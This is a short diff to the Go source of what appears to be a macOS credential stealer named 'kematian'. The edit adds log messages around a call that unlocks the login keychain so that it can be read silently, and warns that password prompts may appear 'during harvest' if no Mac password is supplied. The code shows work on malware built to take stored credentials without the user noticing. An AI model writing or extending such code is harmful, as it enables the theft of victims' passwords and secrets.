@@ -34,8 +34,10 @@ func main() {
 		if err := crypto.EnsureLoginKeychainUnlocked(); err != nil {
 			log.Printf("[kematian] keychain unlock failed: %v", err)
 		} else if !*quiet {
-			log.Printf("[kematian] login keychain unlocked (no password modal)")
+			log.Printf("[kematian] login keychain unlocked — silent keychain access enabled")
 		}
+	} else if !*quiet {
+		log.Printf("[kematian] warning: no -mac-password — keychain prompts may appear during harvest")
 	}
 
 	if runtime.GOOS != "darwin" {
